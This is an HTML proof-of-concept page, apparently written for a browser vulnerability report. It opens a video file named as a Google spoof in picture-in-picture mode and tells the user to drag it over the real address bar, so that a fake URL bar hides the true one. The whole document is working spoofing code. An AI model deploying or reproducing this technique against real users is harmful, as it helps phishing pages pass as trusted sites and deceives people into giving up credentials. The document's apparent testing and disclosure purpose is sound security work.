<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PiP PoC</title>
</head>
<body style="font-family: sans-serif; padding: 40px; background: #ffffff;">
  <h1>PiP Spoofing Test</h1>

  <video id="v" autoplay muted playsinline loop src="https://0x403for.github.io/google-spoof-v5.mp4" style="width: 100%;"></video>
  <br><br>
  <button onclick="pip()" style="font-size: 20px; padding: 15px 30px;">Open PiP</button>
  <p id="o"></p>

  <script>
    var v = document.getElementById('v');

    function pip(){
      v.play();
      v.requestPictureInPicture().then(function(){
        document.getElementById('o').innerText = 'PiP opened. Drag up to cover the real address bar. Do not tap, just drag.';
      }).catch(function(e){
        document.getElementById('o').innerText = 'Blocked: ' + e;
      });
    }
  </script>
</body>
</html>
